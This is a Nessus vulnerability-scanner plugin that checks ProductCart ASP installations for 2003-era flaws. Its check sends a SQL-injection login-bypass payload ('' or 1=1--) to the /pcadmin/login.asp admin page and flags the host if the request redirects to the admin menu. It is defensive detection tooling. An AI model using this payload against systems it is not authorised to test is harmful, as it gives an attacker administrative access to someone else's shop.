# 
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
 script_id(11785);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2003-0522", "CVE-2003-0523", "CVE-2003-1304");
 script_bugtraq_id(8103, 8105, 8108, 8112);
 script_osvdb_id(2280, 10096, 10097, 27619);

 script_name(english:"ProductCart Multiple Vulnerabilities");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is using the ProductCart software suite. 

This set of CGIs is vulnerable to a SQL injection bug that could allow
an attacker to take control of the server as an administrator.  In
addition, the application is susceptible various file disclosure and
cross-site scripting attacks." );
 # https://web.archive.org/web/20040203123656/http://archives.neohapsis.com/archives/bugtraq/2003-07/0057.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f2104096" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2003/Jul/90" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/07/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/06/20");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:early_impact:productcart");
script_end_attributes();

 script_summary(english:"Determine if ProductCart is vulnerable to a sql injection attack");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/ASP");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

foreach dir (cgi_dirs())
{
 r = http_send_recv3(method:"GET", item:dir + "/pcadmin/login.asp?idadmin=''%20or%201=1--", port:port);
 if (isnull(r)) exit(0);
 
 if(egrep(pattern:"^Location: menu\.asp", string:r[1]))
 {
  security_warning(port);
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  exit(0);
 }
}
